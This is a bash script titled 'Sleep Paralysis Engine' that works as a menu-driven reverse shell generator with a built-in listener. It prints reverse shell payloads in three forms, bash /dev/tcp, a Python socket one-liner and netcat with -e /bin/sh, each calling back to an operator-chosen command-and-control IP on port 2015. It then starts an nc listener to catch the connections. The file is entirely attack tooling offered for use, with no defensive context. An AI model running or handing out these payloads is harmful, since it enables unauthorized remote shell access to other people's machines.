#!/usr/bin/env bash
C='\033[0;36m'; W='\033[1;37m'; R='\033[0;31m'; Y='\033[1;33m'; G='\033[0;32m'; N='\033[0m'

while true; do
    clear
    echo -e "${C}==================================================${N}"
    echo -e "${W}             SLEEP PARALYSIS ENGINE${N}"
    echo -e "${W}             By Bogor X Ploit${N}"
    echo -e "${C}==================================================${N}"
    echo ""
    
    PUB_IP=$(curl -s https://api.ipify.org)
    
    echo -e "${Y}[*] C2 Node IP: ${W}${PUB_IP}${N}"
    echo -e "${C}--------------------------------------------------${N}"
    echo -e "${G}[1]${N} Deploy Bash Session Bridge"
    echo -e "${G}[2]${N} Deploy Python Socket Connector"
    echo -e "${G}[3]${N} Deploy Netcat Payload"
    echo -e "${G}[4]${N} Initiate C2 Listener Port 2015"
    echo -e "${G}[5]${N} Back to Main Menu"
    echo -e "${C}--------------------------------------------------${N}"

    echo -ne "${Y}Select option > ${N}"
    read -r rs_choice

    case "$rs_choice" in
        1)
            echo -ne "${Y}Enter C2 IP default: $PUB_IP > ${N}"
            read -r target_ip
            [ -z "$target_ip" ] && target_ip="$PUB_IP"
            echo -e "${G}[+] Compiling Bash Session Bridge...${N}"
            sleep 1
            echo -e "${W}Vector:${N} bash -i >& /dev/tcp/${target_ip}/2015 0>&1"
            echo ""
            read -p "Press Enter to continue..."
            ;;
        2)
            echo -ne "${Y}Enter C2 IP default: $PUB_IP > ${N}"
            read -r target_ip
            [ -z "$target_ip" ] && target_ip="$PUB_IP"
            echo -e "${G}[+] Compiling Python Socket Connector...${N}"
            sleep 1
            echo -e "${W}Vector:${N}"
            echo -e "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${target_ip}\",2015));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            echo ""
            read -p "Press Enter to continue..."
            ;;
        3)
            echo -ne "${Y}Enter C2 IP default: $PUB_IP > ${N}"
            read -r target_ip
            [ -z "$target_ip" ] && target_ip="$PUB_IP"
            echo -e "${G}[+] Compiling Netcat Payload...${N}"
            sleep 1
            echo -e "${W}Vector:${N} nc -e /bin/sh ${target_ip} 2015"
            echo ""
            read -p "Press Enter to continue..."
            ;;
        4)
            echo -e "${G}[+] Starting C2 Listener on port 2015...${N}"
            echo -e "${Y}[!] Awaiting incoming connections... (Press CTRL+C to stop)${N}"
            if command -v nc >/dev/null 2>&1; then
                nc -lvnp 2015
            elif command -v ncat >/dev/null 2>&1; then
                ncat -lvnp 2015
            else
                echo -e "${R}[-] Netcat is not installed.${N}"
            fi
            echo ""
            read -p "Press Enter to continue..."
            ;;
        5)
            exit 0
            ;;
        *)
            echo -e "${R}[!] Invalid choice.${N}"
            sleep 1
            ;;
    esac
done
